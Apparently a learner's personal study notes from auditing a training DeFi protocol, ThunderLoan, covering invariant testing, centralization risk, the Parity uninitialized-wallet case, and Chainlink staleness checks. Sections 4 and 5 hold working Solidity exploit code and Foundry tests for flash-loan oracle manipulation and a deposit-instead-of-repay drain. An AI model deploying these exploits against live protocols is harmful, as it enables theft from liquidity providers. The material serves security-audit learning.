# Attack Vectors and Learning

# 1 TEST COVERAGE IMPORTANCE, INVARIANTS

When performing this audit solo, before watching the course notes on it, i found it hard to find bugs at first. I started by testing the invariants to make sure that they were always correct and from the small invariant testing I did, the invariant that made sure liquidity providers deposits never reduced was correct. At this point, I want to stress the importance of running these invariant tests ffirst because it really gives you a full scope of what the protocol is doing. When defining the functions for your handler to prevent reverts, you will have to look through the main contracts in order to properly define the functions in the handler. While looking through the codee, you will be understanding what each function you define does to a good level and you can even find bugs doing that. If you dont, no worries as the invariant test you are setting up can help you find bugs that you ordinarily wouldnt spot. Once the invariant suite is done, then you ccan go back through the contract again and do the manual review for bugs. Invariant testing has to be one of the first thigns you do. Cant stress this enough.

During my manial review, I was having trouble spotting any bugs. So i decided to check the current test coverage of the ThunderLoan contract and saw that it was about 50%. Knowing that it was this low gave me even more confidence that bugs existed. So i went into the unit tests run and looked for any functions that werent tested and ran tests for them which led me to the test_redeem test where i tried to test an edge case where a user tries to withdraw their max amount. You can have a look at the bug I found regarding the redeem function in the report associated with thunderloan. the point I am making is to stress the importance of looking at the test coverage and finding scenarios that were not tested and write tests for them. This point is covered in your security and auditing notes but this shows the practical application and how useful it can be.

# 2 CENTRALIZATION RISK (PRIVATE AUDIT)

When doing static analysis and running aderyn, i saw an error relating to centralization risk and if you read the report in aderynreport.md in this directory, you will see that it has to do with a single entity being able to control almost all actions of the protocol most especially the upgradeability so whenever the owner of thunderloan chooses, they can just upgrade the contract to include any functions they want including malicious functions and this is something that must be reported if you are doing a private audit. In competitive audits, these issues are seen as known issues so you wont have to report them in those instances.

# 3 FAILURE TO INITIALIZE (PRIVATE AUDIT) WITH CASE STUDY

This is another exploit that wont really be reported in a competitive audit because it isnt really a bug but just something to look out for. You already know all about this though from your foundry-UUPSupgradeable directory and the course you did on upgradeable contracts in the foundry web developments course. This exploit relates to when a protocol forgets to call their initializer and someone else either calls their initializer function before them or they decide to call the initializer after some storage slots are already filled in the proxy contract which can break the protocol.

This is why when performing a private audit on any protocol using upgradeable contracts, it is important to let the protocol that they should call the intialize function in the constructor of the proxy as is specified in the openzeppelin uups-upgradeable contract and you can see where i did this in the foundry-UUPSupgradeable directory. There is a real case study where this really happened. You should have a look at it below:

https://github.com/openethereum/parity-ethereum/issues/6995
https://etherscan.io/tx/0x05f71e1b2cb4f03e547739db15d080fd30c989eda04d37ce6264c5686e0722c9
https://pastebin.com/ejakDR1f

If you go through the first link, the contract in question was a WalletLibrary contract that people could create proxy contracts called Wallet and use the WalletLibrary as an implementation contract and the WalletLibrary contract provided functions to create a multi-sig wallet. The problem here was very simple. These people who deployed the original WalletLibrary contract forgot to initialise it by calling their own initwallet function so what that meant was that anyone could call it and soooo someone did. For some reason, the walletlibrary contract had a kill function which contained a suicide low level function which is similar to selfdestruct but the compiler was very old so that version of solidity used suicide at the time.

So what someone did which you can see via the second link was to call initwallet as set themselves as the owner of walletlibrary which is the implementation contract and then they called the kill function which self destructed the contract. This was a MASSIVE issue because there were already a lot of people who deployed the wallet contract which used the walletlibrary contract as its implementation contract. See a list of all the contracts who did this via the third link. choose any of the addresses, view rthem on etherscan and when you view the contract, you will see that the name of the contract is wallet which is a proxy pointing to walletlibrary. so if the walletlibrary contract doesn't exist anymore since said person killed it, then when the proxies make a call to wallet library, they are essentially making a call to a zero address and the wallet contract didnt come with an upgrade function so there was no way to upgrade the implementation contract to another contract and some people's funds were stuck as a result. This is an example that goes to show why initialising the implementation contract when deploying the proxy is so important.

# 4 ORACLE MANIPULATION ATTACK, IMPORTANCE OF BUG REFACTORING

This is the biggest defi hack in all of crypto so there is A LOT to cover here. We are going to go through what this is and how I used an oracle attack to reduce the fee I pay for each time I take a flashloan and this can vastly reduce the protocol's profit.

So to do this, lets start with how to spot the attack. There is an oracleupgradeable contract and it has the following function:

```javascript
 function getPriceInWeth(address token) public view returns (uint256) {
        address swapPoolOfToken = IPoolFactory(s_poolFactory).getPool(token);
        return ITSwapPool(swapPoolOfToken).getPriceOfOnePoolTokenInWeth();
    }
```

An oracle is what protocols use to get information from other sources outside the protocol. There are offchain and on chain oracles. In this case, this protocol is using tswap to get the price of a token in weth. So different protocols need to get the value of certain tokens to be able to do certain things. To do this, they need to get the prices from somewhere. Some protocols use other protocols that have pools to get prices of tokens. for example, with tswap, we are assuming that it has a pool with a token that thunderloan is using and that token is paired with weth.

So thunderloan can get the value of the token in weth by quering how much that token is worth in weth in that pool right now. The reason thunderloan does this is that when calculating the fee, it gets the value of the token and does some math with it. This calculation also calculates the fee value wrong due to an order of operations bug which i will cover later. See below:

```javascript
function getCalculatedFee(
        IERC20 token,
        uint256 amount
    ) public view returns (uint256 fee) {
        //slither-disable-next-line divide-before-multiply
        uint256 valueOfBorrowedToken = (amount *
            getPriceInWeth(address(token))) / s_feePrecision;
        //slither-disable-next-line divide-before-multiply
        fee = (valueOfBorrowedToken * s_flashLoanFee) / s_feePrecision;
    }
```

The problem here is that thunderloan is using a single pool to get a price at the current block. This pool's price can change at any time with people buying and selling that pool on tswap. This means that the fee that thunderloan gets can be manipulated and will vary many times based on people buying and selling tokens on that pool. This means the fee that thunderloan takes for its flash loans will vary a lot based on the price of that pool. This is where the oracle manipulation attack can happen and I will detail how I did this using flash loans.

The idea on a high level would be that a user can reduce fees each time they take a flash loan by manipulating the tswap oracle used to get the price of the token the user is borrowing. To do this, the user takes a flash loan and once they get the loan, go into the pool that thunderloan is basing their prices off and swap a large amount of the token for weth in that pool which means there will me way more of token and way less weth. This will make the price of a pool token in weth much less than it was before based on the calculation in the function above which in turn reduces the fee amount. Then the user can go to another exchange and sell the tokens they just bought from the pool and get the token back and then pay back the loan to thunderloan. Once this is done, the fee is now significantly less than it was before. Now, the user can take a larger flash loan and pay less fees for that same amount of tokens. This is how oracle manipulation will work in this example.

In the BaseTest.t.sol, the original document used deployed using a MockPoolFactory and a MockTswapPool with a fixed price so this wouldnt be able to demonstrate the attack so i took the poolfactory and tswappool.sol contracts from the tswap protocol and imported them here. I initialised them like i did when testing tswap. I also created another exchange called bswap which pretty much uses the same code as the the tswappool contract but the idea was that bswap was going to be the exchange that I would sell the tokens I bought from the pool used as the thunderloan oracle.

I also created a FlashLoanReceiver contract that would do all the aforementioned swaps in the relevant pools and you can see the code for all of that in the contract which was easy enough. Note that the strategy I used in that contract was not profitable simply because the tswap oracle i created only had 100 tokens of token and weth in the pool so when i tried to swap 50 tokens for weth, due to slippage that comes from the swap trying to hold an x\*y=k invariant which we have already learnt about, i dont get anywhere near 50 tokens back which was annoying. Dont focus on the profitability, this example is just to show that the oracle manipulation can be done.

From here, all I did was write a test to prove this which is in the thunderloantest.t.sol file but i will also paste it below:

```javascript
unction test_oraclemanipulation() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(
            tokenA,
            amountToBorrow
        );
        vm.startPrank(user);
        tokenA.mint(address(flashLoanReceiver), AMOUNT * 10);
        thunderLoan.flashloan(
            address(flashLoanReceiver),
            tokenA,
            amountToBorrow,
            ""
        );
        vm.stopPrank();

        uint256 amountToBorrow2 = AMOUNT * 10;
        uint256 calculatedFee2 = thunderLoan.getCalculatedFee(
            tokenA,
            amountToBorrow
        );
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT * 10);
        thunderLoan.flashloan(
            address(mockFlashLoanReceiver),
            tokenA,
            amountToBorrow2,
            ""
        );
        vm.stopPrank();
        console.log(calculatedFee, calculatedFee2);
        assert(calculatedFee > calculatedFee2);
    }
```

This test shows that once the flashloan transaction happens, the calculated fee for the first flashloan and the fee for the second flash loan are very different even though the amounts borrowed in each loan are exactly the same the fee for the second flash loan is less than half of what the first one is due to the orace manipulation. A user can do this everytime they want to take a flash loan which will hurt profits for the protocol and for liquidity providers. This is a very easy example of how oracle manipulation works and we are going to look at a lot more complicated examples of how this works so you will know how this can be exploited. Just keep in mind that if a protocol is using an onchain liquidity pool to get prices that are used for functions in its protocol, those functions can all be attacked using oracle manipulation and flashloans. Another way to do this would be to add functionality in the flashloanreceiver contract I created to call `Thunderloan::flashloan` again after manipulating the fees but add a check to make sure it doesnt make the swaps again in the reentrancy. It just does something else. In this case, i didnt do that. I jyst used the mockflashloanreceiver contract to call `Thunderloan::flashloan` again manually because the mockflashloanreceiver doesn't do the oracle manipulation. It just borrows the funds and pays them back and this shows that the fee when the second flashloan is taken is much lower than the first time. Both ways are acceptable but in reality, i would use the first method to make sure that everything is done in one transaction and no other transactions can happen in between.

# 5 BALANCEOF EXPLOIT

Using the first method, I will introduce an exploit known as the balanceOf exploit. On a high level, whenever you see any contract that uses balanceOf in the code to do anything, alarm bells should be ringing in your head immediately to see how you can exploit it. It is very likely that balanceOf checks can lead to all sorts of exploits. Inflation attacks are a typical example and the next exploit I will show will prove another way that a balanceOf call can be problematic.

I will show you what this looks like and how using the first method could have actually helped you find another bug via bug refactoring.
I refactored the FlashLoanReceiver.sol contract into a new ImplementedFlashLoanReceiver.sol contract. See below:

```javascript
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {IFlashLoanReceiver, IThunderLoan} from "../../src/interfaces/IFlashLoanReceiver.sol";
import {BSwapPool} from "./BSwapPool.sol";
import {TSwapPool} from "./TSwapPool.sol";
import {OracleUpgradeable} from "../protocol/OracleUpgradeable.sol";
import {Test, console} from "forge-std/Test.sol";
import {ThunderLoan} from "../../src/protocol/ThunderLoan.sol";
import {AssetToken} from "../../src/protocol/AssetToken.sol";

contract ImplementedFlashLoanReceiver is Test, OracleUpgradeable {
    error MockFlashLoanReceiver__onlyOwner();
    error MockFlashLoanReceiver__onlyThunderLoan();

    using SafeERC20 for IERC20;

    address s_owner;
    address s_thunderLoan;
    address s_exchangeA;
    address s_exchangeB;
    address s_weth;

    uint256 s_balanceDuringFlashLoan;
    uint256 s_balanceAfterFlashLoan;
    uint8 hasreentered;
    uint256 calculatedFee2;

    constructor(
        address thunderLoan,
        address exchangeA,
        address exchangeB,
        address weth
    ) {
        s_owner = msg.sender;
        s_thunderLoan = thunderLoan;
        s_balanceDuringFlashLoan = 0;
        s_exchangeA = exchangeA;
        s_exchangeB = exchangeB;
        s_weth = weth;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address initiator,
        bytes calldata /*  params */
    ) external returns (bool) {
        s_balanceDuringFlashLoan = IERC20(token).balanceOf(address(this));

        /* if (initiator != s_owner) {
            revert MockFlashLoanReceiver__onlyOwner();
        } */
        if (msg.sender != s_thunderLoan) {
            revert MockFlashLoanReceiver__onlyThunderLoan();
        }
        uint256 calculatedFee = ThunderLoan(s_thunderLoan).getCalculatedFee(
            IERC20(token),
            100e18
        );
        console.log("calculatedFee: ", calculatedFee);
        if (hasreentered == 0) {
            hasreentered++;
            IERC20(token).approve(s_exchangeA, 50e18);
            IERC20(s_weth).approve(s_exchangeB, 50e18);
            TSwapPool(s_exchangeA).swapExactInput(
                IERC20(token),
                50e18,
                IERC20(s_weth),
                33e18,
                uint64(block.timestamp)
            );

            BSwapPool(s_exchangeB).swapExactInput(
                IERC20(s_weth),
                33e18,
                IERC20(token),
                22e18,
                uint64(block.timestamp)
            );

            calculatedFee2 = ThunderLoan(s_thunderLoan).getCalculatedFee(
                IERC20(token),
                100e18
            );
            console.log("calculatedFee: ", calculatedFee2);
            ThunderLoan(s_thunderLoan).flashloan(
                address(this),
                IERC20(token),
                100e18,
                ""
            );
        }

        AssetToken assettoken = ThunderLoan(s_thunderLoan).getAssetFromToken(
            IERC20(token)
        );

        IERC20(token).approve(address(assettoken), amount + fee);
         IERC20(token).approve(s_thunderLoan, amount + fee);
        //IThunderLoan(s_thunderLoan).repay(token, amount + fee);
        //IERC20(token).safeTransfer(address(assettoken), amount + fee);
        ThunderLoan(s_thunderLoan).deposit(IERC20(token), amount + fee);

        s_balanceAfterFlashLoan = IERC20(token).balanceOf(address(this));
        return true;
    }

    function getBalanceDuring() external view returns (uint256) {
        return s_balanceDuringFlashLoan;
    }

    function getBalanceAfter() external view returns (uint256) {
        return s_balanceAfterFlashLoan;
    }
}


```

If you compare the above contract to the FlashLoanReceiver contract, you will see how I implmented everything I said above. I created a hasreentered variable to check if the function has been reentered and while the function waas in its top level call (first call to the function without reentrancy), i performed all the swaps to manipulate the tswap price oracle and then called the flashloan function again to reenter. At this point, hasreentered will be 1 so the if block will not run and it will simply run the rest of the execute operation function by approving and repaying the flashloan which is straightforward enough.

Notice how I commented out the repay function because when i ran it with the repay function, i got the following error:

← [Revert] ThunderLoan\_\_NotCurrentlyFlashLoaning()

This was because the repay function contains the following code:

```javascript
function repay(IERC20 token, uint256 amount) public {
        if (!s_currentlyFlashLoaning[token]) {
            revert ThunderLoan__NotCurrentlyFlashLoaning();
        }
        AssetToken assetToken = s_tokenToAssetToken[token];
        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```

There is a s_currentlyFlashLoaning[token] check here and when we reenter the repay function, this mapping is set to false and for this reason, the repay function cannot be called when reentering the flashloan function. This didnt mean that we couldn't repay the flash loan back. What I mean is that to pay the flash loan back, we dont have to call the repay function becuase the flashloan function simply checks the starting balance of the contract before the loan, then check the balance of the thunderloan contract after the loan and makes sure the amount of the flashloan + fee is added to the balance of the contract. So instead of using the repay function, I simply used a low level transfer function to send the correct amount back to the assettoken contract which is what the repay function does and this way, we can repay the amount back. Note that the funds were stored in the assettoken contract. I did this in the contract above and commented it out but if you uncomment it and run the code, you will see that it works.

So now, you know that the repay function isnt the only way to repay the contract, this provides scope for another attack vector because when you think about it, if the repay function isnt the only way to fund the contract, what else in the contract can we use to fund the contract and use the balanceOf exploit? Well I can simply call the deposit function in the thunderloan contract and that function will change the balance of the asset token contract. I am sure you can see where we are going from here. If i can call the deposit function and deposit the flashloan + fee back into thunderloan, this will pass all the checks to repay the flashloan. Since we have now deposited the loan, we can then call the redeem function in the test and take the money out of the protocol. So to summarise, take flash loan, pay back the loan by depositing the loan into the protocol, then redeem the funds we just deposited in the function. This is what the implementedflashloanreceiver contract does. See the test below:

```javascript
function test_oraclemanipulationv2() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        vm.startPrank(user);
        tokenA.mint(address(implementedFlashLoanReceiver), AMOUNT * 10);
        uint256 balancebefore = tokenA.balanceOf(
            address(implementedFlashLoanReceiver)
        );
        thunderLoan.flashloan(
            address(implementedFlashLoanReceiver),
            tokenA,
            amountToBorrow,
            ""
        );
        vm.stopPrank();
        vm.startPrank(address(implementedFlashLoanReceiver));
        thunderLoan.redeem(tokenA, implementedFlashLoanReceiver.amountfee());
        vm.stopPrank();
        uint256 balanceafter = tokenA.balanceOf(
            address(implementedFlashLoanReceiver)
        );
        assert(balanceafter > balancebefore);
    }
```

There have been so many oracle manipulation exploits that have happened and one of these can be seen here https://rekt.news/cream-rekt-2/. I want to go through exactly what happened so i will do this at a later date but the idea is extremely similar to what I have just shown above where a flash loan was taken and a bunch of things were done with the flash loan to rekt a protocol based on a faulty oracle and then pay back the flash loan. My example was not profitable but this one sure was so we are going to go over exactly how this happened.

WHEN YOU MAKE NOTES ON ORACLE MANIPULATION, USE ALL THE MORE COMPLEX EXAMPLES FROM OWEN THURAM AS WELL AS THE EXPLAINER GIVEN BY PATRICK

# 6 EASY MEDIUM FINDING IN PROTOCOLS USING CHAINLINK PRICE ORACLES

To avoid the above oracle manipulation attack, use a decentralised price oracle like chainlink to get more accurate token prices that are aggregated from multiple sources. You can also use TWAP's which are time weighted average prices which still get prices from one pool but the prices are averaged over a number of blocks so even if a tries to reduce fees using oracle manipulation, the price that will be used will not be the price at the current block. It will be the price of the asset averaged over a number of blocks which means that this attack wont work. TWAP's have also been manipulated previously so this might not be the best solution. Best option is to use a chainlink price oracle. We have used the chainlink price oracle a lot during cyfrin courses so go back over your notes to recap how this works or you could just go to the chainlink docs.

When using chainlink price oracles, make sure to check for the last updated time of the price you are getting because sometimes the chainlink oracles can fail to update the price for a while and this can lead to incorrect prices on occassion. This can actually be a medium finding in any protocols that use chainlink price oracles because most protocols dont perform this check. This is an easy way to report a medium finding. Very important. See an example of this finding below:

Issue: Outdated Prices in `Ignite::register()`

The `register()` function of the **Ignite** contract fetches the **AVAX** and **QI** prices from Chainlink Oracles whenever a new validator node registration is requested. However, the function currently does not validate whether the prices retrieved are up-to-date, potentially leading to the use of **outdated prices** when the oracles are down or unresponsive.

---

### **`register()` Function**

The `register()` function is responsible for registering validator nodes. It fetches the current prices of AVAX and QI from Chainlink Oracles.

```solidity
function register(
    string memory nodeId,
    uint validationDuration
) external payable {
    ...
    // Fetch the AVAX and QI prices from Chainlink Oracles
    (, int256 avaxPrice, , ,) = avaxPriceFeed.latestRoundData();
    (, int256 qiPrice, , ,) = qiPriceFeed.latestRoundData();
    ...
}
```

Potential Problem
The Chainlink Oracles may become unresponsive or experience downtime.
If the oracles are down, the function may fetch outdated prices, which could lead to incorrect calculations or financial losses for users.

Solution
Check for Last Updated Timestamp
The Chainlink Oracles provide the last updated timestamp for each price. Adding a check for this timestamp can help ensure that only up-to-date prices are used.

Suggested Implementation
Modify the register() function to validate the price's last updated timestamp:

```solidity
function register(
    string memory nodeId,
    uint validationDuration
) external payable {
    ...
    // Fetch the AVAX and QI prices along with their last updated timestamps
    (, int256 avaxPrice, , uint256 avaxUpdatedAt, ) = avaxPriceFeed.latestRoundData();
    (, int256 qiPrice, , uint256 qiUpdatedAt, ) = qiPriceFeed.latestRoundData();

    // Require that the prices are up-to-date (e.g., updated within the last hour)
    uint256 currentTime = block.timestamp;
    require(currentTime - avaxUpdatedAt < 1 hours, "AVAX price is outdated");
    require(currentTime - qiUpdatedAt < 1 hours, "QI price is outdated");

    ...
}

```

# 7 INFLATION ATTACK ATTEMPT

I tried to perform an inflation attack on this protocol. I learnt about inflation attacks from my brief shadow audit of the gogopool protocol so you can have a look there to know more about what my aims were. Inflation attacks can be performed on contracts that deal in an asset token and a share token which accrues interest. This is the basis of it. The token standard for this is ERC4626 but whenever you see a contract that does this, know that you can perform an inflation attack whether they use 4626 or not.

When i tried to perform an inflation attack on thunderloan, my aim was first to see if i could make a small enough initial deposit and then front run the next users deposit like a typical inflation attack. The problem was that the protocol said in their docs that they would make the initial deposit so that plan went out of the window BUT i could still swallow a users deposit by making the amount of AssetToken they minted 0 which means that they just donate their assets to the protocol which i am already a depositer in so the donation goes to me when i redeem my tokens.

This was also impossible to do because to calculate the mint amount, they don’t use the standard exchange rate calculation of amount multiplied by (shares/assets). Their exchange rate literally cannot go down, so to make the mint amount equal to 0, the flash loan amount has to be incredibly large. I’m talking about 1 quadrillion ETH, which is just not feasible. Therefore, I cannot make anyone’s mint amount equal to 0.
This was the calculation for the mint amount in the deposit formula:

```javascript
function deposit(
        IERC20 token,
        uint256 amount
    ) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) /
            exchangeRate;
        console.log("exchangeRate", exchangeRate);
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);
        uint256 calculatedFee = getCalculatedFee(token, amount); //bug why is a fee calculated when depositing? the amount for getcalculatedfee is the amount a user wants to borrow and not an amount a user deposits? When this happens, it means that the depositor can never redeem their full amount. See test_redeem in the test file
        //assetToken.updateExchangeRate(calculatedFee); //bug comment out this line to allow depositor to redeem full amount or refactor updateexchangerate to allow for a deposit without updating the exchange rate DOS
        token.safeTransferFrom(msg.sender, address(assetToken), amount);}
```

My plan was to take a flash loan so big that it skews the fee enough to make the exchange rate (denominator for mint amount calculation) more than the amount multiplied by 1e18, which is their exchange rate precision factor (numerator for mint amount calculation). Doing this would make the mint amount less than 0, which would round down to 0. This means that when the user mints an expected amount, their mint amount would be 0, completing the attack. However, that flash loan amount isn’t feasible, so the attack cannot run.

I considered also repeatedly calling the flash loan to make the exchange rate go up and up, but there’s no incentive for that because each time the flash loan is called, i pay the fee. That doesn’t make sense unless i skew the fee calculation to make me pay no fees each time i call the flash loan function which would definitely work but requires a lot more thinking which i can probably do in my spare time but just know that an inflation attack can be done here via oracle manipulation.

# 8 REWARD MANIPULATION ATTACK (LINK TO DIVING DEEP INTO MATHS POINT MADE IN GOGOPOOL NOTES.MD)

Looking at the H-1 in the findings.md, the bug reported there is known as a reward manipulation attack where a protocol messes up their logic for calculating fees/rewards of some sort and this mishandling leads to errors and can also potentially lead to exploits. This reward manipulation attack was the second most exploit used for attacking protocols in 2023 so it is very key to watch out for as a lot of protocols fall victim to this.

This is going to be your way to make money. Once you look at a codebase. Dive deep into their reward mechanism and make sure that it is fdoing what it is supposed to do. This is going to be a place where you will find a lot of bugs. Usually, the reward mechanism of protocols will involve a lot of maths. You should embrace it and dive very deep into the maths of all these protocolsas this is where the bugs will be a lot of the time. This ties into the point I made in the notes.md of the shadow audit I did of the gogopool protocol about always diving very deep into the maths of every ptotocol and making sure the maths is on point. Once you see a protocol that has a lot of maths/reward mechanism, you should be licking your lips as bugs are ripe for the finding.

# 9 DIFF COMMAND FOR COMPARING CONTRACTS

In the H-3 of the findings.md, i discussed how i used diff ./src/protocol/ThunderLoan.sol ./src/upgradedProtocol/ThunderLoanUpgraded.sol to compare 2 contracts. This is a very helpful tool to have in your arsenal especially when comparing an old contract to an upgraded contract as I did in that finding. It will usually look like this:

< uint256 private s_feePrecision;

>     uint256 public constant FEE_PRECISION = 1e18;

The < means that this was a line in the first contract that wasnt in the second. The > means that this was a line in the second contract that wasnt in the first. Very useful tool and you should use this where necessary.
